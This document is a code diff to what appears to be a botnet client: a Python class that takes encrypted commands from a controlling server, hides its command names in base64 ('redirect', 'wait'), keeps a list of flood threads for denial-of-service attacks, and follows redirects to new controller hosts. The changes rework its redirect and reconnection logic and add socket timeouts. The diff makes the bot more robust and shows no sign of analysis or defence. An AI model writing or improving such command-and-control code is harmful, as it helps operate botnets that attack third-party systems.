@@ -118,7 +118,7 @@ class Client:
     def _listen_server(self):
         try:
             while self.running:
-                ready, _, _ = select.select([self.sock], [], [], 60)
+                ready, _, _ = select.select([self.sock], [], [], 5)
                 if not ready:
                     continue
                 # Receive encrypted session key
@@ -199,28 +199,21 @@ class Client:
                             self._flood_threads.append(t)
 
                     elif command == _decode_str("cmVkaXJlY3Q="):
-                        current_node = f"{self.server_host}:{self.server_port}"
                         data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                         new_host = data.get(_decode_str("aG9zdA=="))
                         new_port = data.get(_decode_str("cG9ydA=="))
                         if not new_host or not new_port:
                             return
-                        new_node = f"{new_host}:{new_port}"
-                        if new_node != current_node:
-                            self.server_host = new_host
-                            self.server_port = new_port
-                            self.redirects += 1
-                            self.running = False
-                            self.connect()
-                        else:
-                            self.close()
+                        self.server_host = new_host
+                        self.server_port = new_port
+                        self.redirects += 1
+                        return
 
                     elif command == _decode_str("d2FpdA=="):
                         data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                         wait_s = data.get(_decode_str("cw=="), 60)
-                        self.running = False
                         time.sleep(wait_s)
-                        self.connect()
+                        return
 
                 except KeyError as e:
                     self.logger.debug(f"Unknown command key: {e}")
@@ -238,6 +231,7 @@ class Client:
     # Helper: Receive exact number of bytes
     def _recv_n_bytes(self, n):
         data = b""
+        self.sock.settimeout(10)
         while len(data) < n:
             try:
                 chunk = self.sock.recv(n - len(data))
